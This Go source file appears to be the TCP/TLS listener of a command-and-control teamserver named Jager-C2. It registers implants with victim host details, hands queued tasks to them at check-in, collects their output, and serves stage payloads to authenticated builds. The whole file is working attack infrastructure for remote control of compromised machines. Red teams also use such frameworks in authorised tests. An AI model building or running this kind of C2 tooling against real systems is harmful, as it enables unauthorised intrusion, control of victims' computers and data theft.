package listeners

import (
	"crypto/tls"
	"encoding/binary"
	"encoding/json"
	"fmt"
	"io"
	"net"
	"sync"

	"github.com/0xhackerfren/Jager-C2/teamserver/internal/crypto"
	pb "github.com/0xhackerfren/Jager-C2/teamserver/proto/jagerpb"
	"github.com/0xhackerfren/Jager-C2/teamserver/internal/sessions"
	"go.uber.org/zap"
)

// TCPListener implements a raw TCP/TLS transport for high-throughput C2.
// Uses length-prefixed binary framing with optional TLS encryption.
type TCPListener struct {
	id       string
	cfg      *pb.ListenerConfig
	sessions *sessions.Manager
	tasks    TaskQueue
	builds   BuildStore
	logger   *zap.Logger

	listener net.Listener
	done     chan struct{}
	wg       sync.WaitGroup
}

func NewTCPListener(cfg *pb.ListenerConfig, sess *sessions.Manager, tq TaskQueue, bs BuildStore, logger *zap.Logger) (*TCPListener, error) {
	return &TCPListener{
		id:       cfg.Id,
		cfg:      cfg,
		sessions: sess,
		tasks:    tq,
		builds:   bs,
		logger:   logger.Named("tcp"),
		done:     make(chan struct{}),
	}, nil
}

func (l *TCPListener) Start() error {
	addr := fmt.Sprintf("%s:%d", l.cfg.BindHost, l.cfg.BindPort)
	var err error

	// Check if TLS is configured
	httpsCfg := l.cfg.GetHttps()
	if httpsCfg != nil && httpsCfg.TlsCert != "" && httpsCfg.TlsKey != "" {
		cert, err := tls.X509KeyPair([]byte(httpsCfg.TlsCert), []byte(httpsCfg.TlsKey))
		if err != nil {
			return fmt.Errorf("load TLS keypair: %w", err)
		}
		tlsCfg := &tls.Config{
			Certificates: []tls.Certificate{cert},
			MinVersion:   tls.VersionTLS12,
		}
		l.listener, err = tls.Listen("tcp", addr, tlsCfg)
		if err != nil {
			return fmt.Errorf("TLS listen: %w", err)
		}
		l.logger.Info("TCP/TLS listener started", zap.String("addr", addr))
	} else {
		l.listener, err = net.Listen("tcp", addr)
		if err != nil {
			return fmt.Errorf("TCP listen: %w", err)
		}
		l.logger.Info("TCP listener started (no TLS)", zap.String("addr", addr))
	}

	l.wg.Add(1)
	go l.acceptLoop()
	return nil
}

func (l *TCPListener) Stop() error {
	close(l.done)
	if l.listener != nil {
		l.listener.Close()
	}
	l.wg.Wait()
	return nil
}

func (l *TCPListener) ID() string {
	return l.id
}

func (l *TCPListener) Config() *pb.ListenerConfig {
	return l.cfg
}

func (l *TCPListener) acceptLoop() {
	defer l.wg.Done()

	for {
		conn, err := l.listener.Accept()
		if err != nil {
			select {
			case <-l.done:
				return
			default:
				l.logger.Error("accept error", zap.Error(err))
				continue
			}
		}

		l.wg.Add(1)
		go l.handleConn(conn)
	}
}

// Wire protocol:
// [1 byte msg_type][4 bytes payload_len (big-endian)][payload]
// msg_type: 0x01=register, 0x02=checkin, 0x03=result, 0x04=stage_request
const (
	msgTypeRegister = 0x01
	msgTypeCheckin  = 0x02
	msgTypeResult   = 0x03
	msgTypeStage    = 0x04
)

func (l *TCPListener) handleConn(conn net.Conn) {
	defer l.wg.Done()
	defer conn.Close()

	for {
		select {
		case <-l.done:
			return
		default:
		}

		// Read header: 1 byte type + 4 bytes length
		header := make([]byte, 5)
		if _, err := io.ReadFull(conn, header); err != nil {
			return
		}

		msgType := header[0]
		payloadLen := binary.BigEndian.Uint32(header[1:5])
		if payloadLen > 50*1024*1024 { // 50MB max
			l.logger.Warn("payload too large", zap.Uint32("size", payloadLen))
			return
		}

		payload := make([]byte, payloadLen)
		if payloadLen > 0 {
			if _, err := io.ReadFull(conn, payload); err != nil {
				return
			}
		}

		response, closeConn := l.dispatch(msgType, payload)
		l.sendResponse(conn, response)
		if closeConn {
			return
		}
	}
}

func (l *TCPListener) sendResponse(conn net.Conn, data []byte) {
	header := make([]byte, 4)
	binary.BigEndian.PutUint32(header, uint32(len(data)))
	conn.Write(header)
	conn.Write(data)
}

func (l *TCPListener) dispatch(msgType byte, payload []byte) ([]byte, bool) {
	switch msgType {
	case msgTypeRegister:
		return l.handleRegister(payload)
	case msgTypeCheckin:
		return l.handleCheckin(payload), false
	case msgTypeResult:
		return l.handleResult(payload), false
	case msgTypeStage:
		return l.handleStageRequest(payload), false
	default:
		return []byte(`{"error":"unknown message type"}`), false
	}
}

func (l *TCPListener) handleRegister(data []byte) ([]byte, bool) {
	var reg struct {
		ImplantID  string `json:"implant_id"`
		BuildID    string `json:"build_id"`
		BuildToken string `json:"build_token"`
		Token      string `json:"token"`
		Hostname   string `json:"hostname"`
		Username   string `json:"username"`
		OS         string `json:"os"`
		Arch       string `json:"arch"`
		PID        int    `json:"pid"`
		Integrity  string `json:"integrity"`
	}
	if err := json.Unmarshal(data, &reg); err != nil {
		return []byte(`{"error":"invalid registration"}`), true
	}

	token := reg.BuildToken
	if token == "" {
		token = reg.Token
	}
	if reg.BuildID == "" || token == "" {
		l.logger.Warn("TCP registration missing build credentials",
			zap.String("implant_id", reg.ImplantID))
		return []byte(`{"error":"forbidden"}`), true
	}
	if !crypto.ValidateBuildToken(reg.BuildID, token) {
		l.logger.Warn("TCP registration rejected: invalid build token",
			zap.String("build_id", reg.BuildID),
			zap.String("implant_id", reg.ImplantID))
		return []byte(`{"error":"forbidden"}`), true
	}

	pbReg := &pb.ImplantRegistration{
		ImplantId: reg.ImplantID,
		BuildId:   reg.BuildID,
		Hostname:  reg.Hostname,
		Username:  reg.Username,
		Os:        "windows",
		Transport: pb.Transport_TRANSPORT_TCP,
	}

	l.sessions.RegisterBeacon(pbReg, 5, 0)
	resp, _ := json.Marshal(map[string]string{"status": "ok", "id": reg.ImplantID})
	return resp, false
}

func (l *TCPListener) handleCheckin(data []byte) []byte {
	var req struct {
		SessionID string `json:"session_id"`
	}
	if err := json.Unmarshal(data, &req); err != nil {
		return []byte(`{"tasks":[]}`)
	}

	l.sessions.Checkin(req.SessionID)
	l.tasks.RedeliverSentTasks(req.SessionID)
	pending := l.tasks.Dequeue(req.SessionID, 20)

	type taskOut struct {
		ID   string `json:"id"`
		Type int32  `json:"type"`
		Data []byte `json:"data,omitempty"`
	}
	tasks := make([]taskOut, 0, len(pending))
	for _, t := range pending {
		tasks = append(tasks, taskOut{ID: t.Id, Type: int32(t.Type), Data: t.RequestData})
	}
	resp, _ := json.Marshal(map[string]interface{}{"tasks": tasks})
	return resp
}

func (l *TCPListener) handleResult(data []byte) []byte {
	var result struct {
		SessionID string `json:"session_id"`
		TaskID    string `json:"task_id"`
		Output    []byte `json:"output"`
		Error     string `json:"error"`
	}
	if err := json.Unmarshal(data, &result); err != nil {
		return []byte(`{"error":"invalid result"}`)
	}

	l.tasks.Complete(result.TaskID, result.SessionID, result.Output, result.Error)
	return []byte(`{"status":"ok"}`)
}

func (l *TCPListener) handleStageRequest(data []byte) []byte {
	var req struct {
		BuildID    string `json:"build_id"`
		BuildToken string `json:"build_token"`
		Token      string `json:"token"`
	}
	if err := json.Unmarshal(data, &req); err != nil {
		return []byte(`{"error":"invalid request"}`)
	}

	token := req.BuildToken
	if token == "" {
		token = req.Token
	}
	if req.BuildID == "" || token == "" {
		l.logger.Warn("TCP stage request missing build credentials",
			zap.String("build_id", req.BuildID))
		return []byte(`{"error":"forbidden"}`)
	}
	if !crypto.ValidateBuildToken(req.BuildID, token) {
		l.logger.Warn("TCP stage request rejected: invalid build token",
			zap.String("build_id", req.BuildID))
		return []byte(`{"error":"forbidden"}`)
	}

	payload, err := l.builds.GetStagePayload(req.BuildID)
	if err != nil {
		return []byte(`{"error":"build not found"}`)
	}
	return payload
}
